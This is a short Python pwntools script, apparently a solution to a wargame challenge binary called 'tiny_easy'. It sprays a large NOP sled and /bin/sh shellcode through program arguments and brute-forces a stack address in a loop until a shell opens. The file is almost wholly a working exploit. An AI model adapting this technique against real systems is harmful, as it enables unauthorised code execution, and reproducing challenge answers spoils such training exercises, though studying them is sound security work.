import sys
import os
import base64
from pwn import *

# 0x00000002      0xffffd34d      0xffffd368      0x00000000

place = 0xffffd3ad
# place = 0xffd2bc40
place = 0xffffd230
context.terminal= ['tmux', 'split', '-h']
context.log_level = 'critical'
exploit = asm(shellcraft.i386.linux.sh())
exploit = b'\x90'*120000 + exploit



def brute():
    while True:
        try:
            p = process(argv=[p32(0x00000000fff524d4-1000), exploit], executable='./tiny_easy', env={})
            p.sendline(b"id")
            re = p.recv(3)
            print(re)
            p.interactive()
        except KeyboardInterrupt:
            exit()
        except:
            pass
    # gdb.attach(p, """
    #     set *(short*)$eip=0x5a58
    #     context
    # """)

    # p.interactive()
brute()